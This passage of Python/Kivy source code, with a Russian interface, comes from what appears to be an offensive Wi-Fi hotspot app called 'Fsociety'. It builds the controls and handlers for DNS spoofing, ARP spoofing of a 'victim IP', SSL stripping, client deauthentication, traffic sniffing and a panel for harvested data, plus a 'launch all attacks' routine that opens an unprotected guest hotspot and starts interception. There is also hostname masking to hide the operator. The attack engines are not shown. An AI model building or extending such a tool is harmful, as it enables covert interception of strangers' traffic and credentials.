        atk_l.add_widget(arp_box)
        self.arp_target = HackInput(hint_text='IP жертвы', multiline=False, size_hint=(1,0.05))
        atk_l.add_widget(self.arp_target)
        self.arp_gateway = HackInput(hint_text='IP шлюза', multiline=False, size_hint=(1,0.05))
        atk_l.add_widget(self.arp_gateway)
        # SSL
        ssl_box = BoxLayout(orientation='horizontal', size_hint=(1,0.06))
        ssl_box.add_widget(HackLabel(text='SSL Strip', size_hint=(0.6,1), tooltip_text='Понижает HTTPS'))
        self.ssl_switch = HackSwitch(active=False, tooltip_text='Требует root')
        self.ssl_switch.bind(active=self._on_ssl)
        ssl_box.add_widget(self.ssl_switch)
        atk_l.add_widget(ssl_box)
        # Deauth
        deauth_box = BoxLayout(orientation='horizontal', size_hint=(1,0.06))
        deauth_box.add_widget(HackLabel(text='Деавторизация', size_hint=(0.6,1), tooltip_text='Отключает клиента'))
        self.deauth_switch = HackSwitch(active=False, tooltip_text='Требует root')
        self.deauth_switch.bind(active=self._on_deauth)
        deauth_box.add_widget(self.deauth_switch)
        atk_l.add_widget(deauth_box)
        self.deauth_target = HackInput(hint_text='MAC клиента', multiline=False, size_hint=(1,0.05))
        atk_l.add_widget(self.deauth_target)

        btn_all = HackButton(text='💣 ЗАПУСТИТЬ ВСЕ', size_hint=(1,0.08))
        btn_all.bind(on_press=self._run_all_attacks)
        atk_l.add_widget(btn_all)
        self.attack_tab.add_widget(atk_l)
        self.add_widget(self.attack_tab)

        # Сниффинг
        self.sniff_tab = TabbedPanelItem(text='[ Сниффинг ]')
        sniff_l = BoxLayout(orientation='vertical')
        sniff_l.add_widget(HackLabel(text='[ ПЕРЕХВАТ ТРАФИКА ]', font_size='18sp', bold=True))
        self.sniff_switch = HackSwitch(active=False, size_hint=(0.3,0.06), pos_hint={'center_x':0.5},
                                       tooltip_text='Вкл/Выкл сниффинг (требует root)')
        self.sniff_switch.bind(active=self._on_sniff)
        sniff_l.add_widget(self.sniff_switch)
        self.sniff_info = HackLabel(text='Сниффинг выключен', font_size='14sp')
        sniff_l.add_widget(self.sniff_info)
        self.sniff_tab.add_widget(sniff_l)
        self.add_widget(self.sniff_tab)

        # Устройства
        self.devices_tab = TabbedPanelItem(text='[ Устройства ]')
        dev_l = BoxLayout(orientation='vertical')
        self.devices_list = ScrollView()
        self.devices_grid = GridLayout(cols=3, spacing=dp(5), size_hint_y=None)
        self.devices_grid.bind(minimum_height=self.devices_grid.setter('height'))
        self.devices_list.add_widget(self.devices_grid)
        dev_l.add_widget(self.devices_list)
        btn_refresh = HackButton(text='🔄 Обновить', size_hint=(1,0.08))
        btn_refresh.bind(on_press=self._refresh_devices)
        dev_l.add_widget(btn_refresh)
        self.devices_tab.add_widget(dev_l)
        self.add_widget(self.devices_tab)

        # Трафик
        self.traffic_tab = TabbedPanelItem(text='[ Трафик ]')
        tr_l = BoxLayout(orientation='vertical')
        self.traffic_filter = HackInput(hint_text='Фильтр (IP/порт)', multiline=False, size_hint=(1,0.05))
        tr_l.add_widget(self.traffic_filter)
        self.traffic_list = ScrollView()
        self.traffic_grid = GridLayout(cols=4, spacing=dp(2), size_hint_y=None)
        self.traffic_grid.bind(minimum_height=self.traffic_grid.setter('height'))
        self.traffic_list.add_widget(self.traffic_grid)
        tr_l.add_widget(self.traffic_list)
        btn_clear = HackButton(text='🗑 Очистить', size_hint=(1,0.06))
        btn_clear.bind(on_press=self._clear_traffic)
        tr_l.add_widget(btn_clear)
        self.traffic_tab.add_widget(tr_l)
        self.add_widget(self.traffic_tab)

        # Лог
        self.log_tab = TabbedPanelItem(text='[ Лог ]')
        log_l = BoxLayout(orientation='vertical')
        self.log_list = ScrollView()
        self.log_grid = GridLayout(cols=2, spacing=dp(2), size_hint_y=None)
        self.log_grid.bind(minimum_height=self.log_grid.setter('height'))
        self.log_list.add_widget(self.log_grid)
        log_l.add_widget(self.log_list)
        btn_clear_log = HackButton(text='🗑 Очистить', size_hint=(1,0.06))
        btn_clear_log.bind(on_press=self._clear_log)
        log_l.add_widget(btn_clear_log)
        self.log_tab.add_widget(log_l)
        self.add_widget(self.log_tab)

        # Безопасность
        self.security_tab = TabbedPanelItem(text='[ Безопасность ]')
        sec_l = BoxLayout(orientation='vertical', spacing=dp(5), padding=dp(10))
        sec_l.add_widget(HackLabel(text='[ ЗАЩИТА ОПЕРАТОРА ]', font_size='18sp', bold=True))
        self.hostname_spoof = HackInput(hint_text='Новое имя хоста', multiline=False, size_hint=(1,0.05))
        sec_l.add_widget(self.hostname_spoof)
        btn_apply_sec = HackButton(text='🛡 Применить', size_hint=(1,0.06))
        btn_apply_sec.bind(on_press=self._apply_masking)
        sec_l.add_widget(btn_apply_sec)
        self.enc_switch = HackSwitch(active=self.config.get('log_encrypted'), tooltip_text='Шифровать логи')
        enc_box = BoxLayout(orientation='horizontal', size_hint=(1,0.05))
        enc_box.add_widget(HackLabel(text='🔐 Шифрование логов', size_hint=(0.6,1)))
        enc_box.add_widget(self.enc_switch)
        self.enc_switch.bind(active=lambda inst, val: self._on_switch('log_encrypted', val))
        sec_l.add_widget(enc_box)
        self.security_tab.add_widget(sec_l)
        self.add_widget(self.security_tab)

        # Аналитика
        self.analytics_tab = TabbedPanelItem(text='[ 🔬 Аналитика ]')
        an_l = BoxLayout(orientation='vertical')
        an_l.add_widget(HackLabel(text='[ НАЙДЕННЫЕ ДАННЫЕ ]', font_size='18sp', bold=True))
        self.analytics_list = ScrollView()
        self.analytics_grid = GridLayout(cols=3, spacing=dp(5), size_hint_y=None)
        self.analytics_grid.bind(minimum_height=self.analytics_grid.setter('height'))
        self.analytics_list.add_widget(self.analytics_grid)
        an_l.add_widget(self.analytics_list)
        btn_clear_an = HackButton(text='🗑 Очистить', size_hint=(1,0.06))
        btn_clear_an.bind(on_press=self._clear_analytics)
        an_l.add_widget(btn_clear_an)
        self.analytics_tab.add_widget(an_l)
        self.add_widget(self.analytics_tab)

        self._clear_analytics(None)

    # --- Обработчики ---
    def _on_switch(self, key, val):
        self.config.set(key, val)
        if key == 'smart_analysis':
            self.add_log('СМАРТ', 'Анализ ' + ('вкл' if val else 'выкл'))
        if key == 'ssid_rotation':
            if val: self.rotator.start()
            else: self.rotator.stop()
        if key == 'anti_scan':
            if val and self.rooted:
                self.anti_scanner.start()
            else:
                self.anti_scanner.stop()
                if val and not self.rooted:
                    self.add_log('АНТИ-СКАН', 'Требуется root для работы')
                    self.switches['anti_scan'].active = False

    def _apply_settings(self, inst):
        ssid = self.ssid_input.text.strip()
        pwd = self.pass_input.text.strip()
        if not re.match(r'^[A-Za-z0-9 _\-.]{1,32}$', ssid):
            self._show_popup('Ошибка', 'Недопустимый SSID')
            return
        if not self.config.get('open_network') and len(pwd) < 8:
            self._show_popup('Ошибка', 'Пароль минимум 8 символов')
            return
        mac_str = self.mac_input.text.strip()
        macs = [m.strip().upper() for m in mac_str.split(',') if m.strip()] if mac_str else []
        for m in macs:
            if not re.match(r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})', m):
                self._show_popup('Ошибка', f'Некорректный MAC: {m}')
                return
        self.config.set('ssid', ssid)
        self.config.set('password', pwd)
        self.config.set('allowed_macs', macs)
        try:
            interval = int(self.rotation_interval.text.strip())
            if interval > 10:
                self.config.set('ssid_rotation_interval', interval)
        except: pass
        self.config.save()
        self.add_log('AP', 'Настройки применены')
        self._show_popup('Успех', 'Настройки сохранены')

    def _on_hotspot(self, inst, val):
        if val:
            if self.hotspot.start():
                self.ap_status.text = 'Статус: АКТИВНА'
                self.ap_status.color = GREEN
                self.add_log('AP', 'Точка включена')
                if self.config.get('anti_scan') and self.rooted:
                    self.anti_scanner.start()
                if self.config.get('ssid_rotation'):
                    self.rotator.start()
            else:
                self.ap_switch.active = False
                self.ap_status.text = 'Статус: ОШИБКА'
                self.ap_status.color = RED
        else:
            self.hotspot.stop()
            self.anti_scanner.stop()
            self.rotator.stop()
            self.ap_status.text = 'Статус: ВЫКЛ'
            self.ap_status.color = RED
            self.add_log('AP', 'Точка выключена')

    def _show_qr(self, inst):
        if not QR_AVAIL:
            self._show_popup('Ошибка', 'qrcode не установлен')
            return
        ssid = self.config.get('ssid')
        pwd = self.config.get('password')
        open_net = self.config.get('open_network')
        qr_data = f'WIFI:T:WPA;S:{ssid};P:{pwd};;' if not open_net else f'WIFI:T:NOPASS;S:{ssid};;'
        img = qrcode.make(qr_data)
        import io, base64
        from kivy.uix.image import Image
        buf = io.BytesIO()
        img.save(buf, format='PNG'); buf.seek(0)
        data = base64.b64encode(buf.read()).decode()
        content = BoxLayout(orientation='vertical')
        content.add_widget(Image(source='data:image/png;base64,'+data, size_hint=(1,0.8)))
        popup = Popup(title='QR-код', content=content, size_hint=(0.9,0.9))
        popup.open()
        self.add_log('QR', 'QR показан')

    # --- Атаки ---
    def _on_dns(self, inst, val):
        if val:
            if not self.rooted:
                self._show_popup('Ошибка', 'Требуется root')
                self.dns_switch.active = False; return
            t = self.dns_target.text.strip(); f = self.dns_fake.text.strip()
            if not t or not f:
                self._show_popup('Ошибка', 'Заполните оба поля')
                self.dns_switch.active = False; return
            if self.attacks.start_dns(t, f):
                self.add_log('DNS', 'Запущен')
            else:
                self.dns_switch.active = False
        else:
            self.attacks.stop_dns(); self.add_log('DNS', 'Остановлен')

    def _on_arp(self, inst, val):
        if val:
            if not self.rooted:
                self._show_popup('Ошибка', 'Требуется root')
                self.arp_switch.active = False; return
            t = self.arp_target.text.strip(); g = self.arp_gateway.text.strip()
            if not t or not g:
                self._show_popup('Ошибка', 'Заполните оба поля')
                self.arp_switch.active = False; return
            if self.attacks.start_arp(t, g):
                self.add_log('ARP', 'Запущен')
            else:
                self.arp_switch.active = False
        else:
            self.attacks.stop_arp(); self.add_log('ARP', 'Остановлен')

    def _on_ssl(self, inst, val):
        if val:
            if not self.rooted:
                self._show_popup('Ошибка', 'Требуется root')
                self.ssl_switch.active = False; return
            if self.attacks.start_ssl():
                self.add_log('SSL', 'Запущен')
            else:
                self.ssl_switch.active = False
        else:
            self.attacks.stop_ssl(); self.add_log('SSL', 'Остановлен')

    def _on_deauth(self, inst, val):
        if val:
            if not self.rooted:
                self._show_popup('Ошибка', 'Требуется root')
                self.deauth_switch.active = False; return
            mac = self.deauth_target.text.strip()
            if not mac:
                self._show_popup('Ошибка', 'Введите MAC клиента')
                self.deauth_switch.active = False; return
            if self.attacks.start_deauth(mac):
                self.add_log('DEAUTH', 'Запущена')
            else:
                self.deauth_switch.active = False
        else:
            self.attacks.stop_deauth(); self.add_log('DEAUTH', 'Остановлена')

    def _run_all_attacks(self, inst):
        if not self.rooted:
            self._show_popup('Ошибка', 'Все атаки требуют root')
            return
        self.quick_all()
        if self.arp_target.text and self.arp_gateway.text:
            self.arp_switch.active = True; self._on_arp(None, True)
        if not self.ssl_switch.active:
            self.ssl_switch.active = True; self._on_ssl(None, True)
        self.add_log('АТАКИ', 'Все запущены')
        self.status_label.text = 'Все атаки активны'

    # --- Быстрые действия ---
    def quick_start(self):
        self.config.set('guest_mode', True); self.config.set('open_network', True)
        self.config.set('hidden_ssid', False); self.config.set('mac_filter_enabled', False)
        self.config.save()
        for key, sw in self.switches.items():
            sw.active = self.config.get(key)
        self._apply_settings(None)
        self.ap_switch.active = True; self._on_hotspot(self.ap_switch, True)
        self.status_label.text = 'Точка запущена (гости)'

    def quick_sniff(self):
        if not self.rooted:
            self._show_popup('Ошибка', 'Сниффинг требует root')
            return
        self.sniff_switch.active = True; self._on_sniff(self.sniff_switch, True)
        self.status_label.text = 'Сниффинг активирован'

    def quick_all(self):
        if not self.rooted:
            self._show_popup('Ошибка', 'Атаки требуют root')
            return
        self.quick_start(); self.quick_sniff()
        self.dns_target.text = 'example.com'; self.dns_fake.text = '192.168.1.1'
        self.dns_switch.active = True; self._on_dns(self.dns_switch, True)
        self.status_label.text = 'Запущены: AP, Sniff, DNS'

    # --- Сниффинг ---
    def _on_sniff(self, inst, val):
        if val:
            if not self.rooted:
                self._show_popup('Ошибка', 'Требуется root')
                self.sniff_switch.active = False; return
            if not self.sniffer:
                self.sniffer = SnifferEngine(self.config, self, self._traffic_callback)
            if self.sniffer.start():
                self.sniff_info.text = 'Сниффинг активен'
                self.add_log('СНИФФИНГ', 'Запущен')
            else:
                self.sniff_switch.active = False
                self.sniff_info.text = 'Ошибка запуска'
        else:
            if self.sniffer: self.sniffer.stop()
            self.sniff_info.text = 'Сниффинг выключен'
            self.add_log('СНИФФИНГ', 'Остановлен')

    # --- Устройства ---
    def _refresh_devices(self, inst=None):
        self.devices_grid.clear_widgets()
        self.devices_grid.add_widget(HackLabel(text='IP', bold=True, size_hint_y=None, height=dp(30)))
        self.devices_grid.add_widget(HackLabel(text='MAC', bold=True, size_hint_y=None, height=dp(30)))
        self.devices_grid.add_widget(HackLabel(text='Имя/Хост', bold=True, size_hint_y=None, height=dp(30)))
        for ip, mac, hostname in self._get_devices():
            self.devices_grid.add_widget(HackLabel(text=ip, size_hint_y=None, height=dp(25)))
            self.devices_grid.add_widget(HackLabel(text=mac, size_hint_y=None, height=dp(25)))
            self.devices_grid.add_widget(HackLabel(text=hostname, size_hint_y=None, height=dp(25)))

    def _get_devices(self):
        devs = []
        try:
            if platform == 'android':
                with open('/proc/net/arp', 'r') as f:
                    for line in f.readlines()[1:]:
                        parts = line.split()
                        if len(parts) >= 4:
                            ip = parts[0]; mac = parts[3]
                            if mac != '00:00:00:00:00:00':
                                devs.append((ip, mac, self._get_hostname(ip)))
            else:
                output = subprocess.check_output(['ip', 'neigh'], text=True)
                for line in output.splitlines():
                    if 'REACHABLE' in line or 'STALE' in line:
                        parts = line.split()
                        ip = parts[0]; mac = parts[4] if len(parts)>4 else 'unknown'
                        devs.append((ip, mac, self._get_hostname(ip)))
        except Exception as e:
            self.add_log('ОШИБКА', f'Устройства: {e}')
        return devs

    def _get_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return 'unknown'

    def _update_ui(self, dt):
        if self.current_tab.text == '[ Устройства ]':
            self._refresh_devices()

    # --- Логирование трафика ---
    def _add_traffic_log(self, src, dst, sport, dport, method, url):
        self.traffic_grid.add_widget(HackLabel(text=f'{src}:{sport}', size_hint_y=None, height=dp(20)))
        self.traffic_grid.add_widget(HackLabel(text=f'{dst}:{dport}', size_hint_y=None, height=dp(20)))
        self.traffic_grid.add_widget(HackLabel(text=method[:8], size_hint_y=None, height=dp(20)))
        self.traffic_grid.add_widget(HackLabel(text=url[:40], size_hint_y=None, height=dp(20)))

    def _clear_traffic(self, inst):
        self.traffic_grid.clear_widgets()
        for t in ['Источник','Назначение','Метод','URL']:
            self.traffic_grid.add_widget(HackLabel(text=t, bold=True, size_hint_y=None, height=dp(25)))

    def _clear_log(self, inst):
        self.log_grid.clear_widgets()
        self.log_grid.add_widget(HackLabel(text='Время / Источник', bold=True, size_hint_y=None, height=dp(25)))
        self.log_grid.add_widget(HackLabel(text='Сообщение', bold=True, size_hint_y=None, height=dp(25)))

    # --- Аналитика ---
    def _add_found(self, name, val, url):
        self.analytics_grid.add_widget(HackLabel(text=name, size_hint_y=None, height=dp(25)))
        self.analytics_grid.add_widget(HackLabel(text=val, size_hint_y=None, height=dp(25)))
        self.analytics_grid.add_widget(HackLabel(text=url[:40], size_hint_y=None, height=dp(25)))

    def _clear_analytics(self, inst):
        self.analytics_grid.clear_widgets()
        for t in ['Тип','Значение','URL']:
            self.analytics_grid.add_widget(HackLabel(text=t, bold=True, size_hint_y=None, height=dp(30)))

    def _show_popup(self, title, text):
        popup = Popup(title=title, content=HackLabel(text=text), size_hint=(0.7,0.3))
        popup.open()

    def _apply_masking(self, inst):
        new_host = self.hostname_spoof.text.strip()
        if new_host:
            try:
                subprocess.call(['sudo', 'hostnamectl', 'set-hostname', new_host])
                self.add_log('МАСКИРОВКА', f'Хост изменён на {new_host}')
                self._show_popup('Успех', f'Хостнейм: {new_host}')
            except Exception as e:
                self._show_popup('Ошибка', f'Не удалось: {e}')

# ============================================================================
# ЗАПУСК
# ============================================================================
class HotspotApp(App):
    def build(self):
        return FsocietyScreen()

if __name__ == '__main__':
    HotspotApp().run()
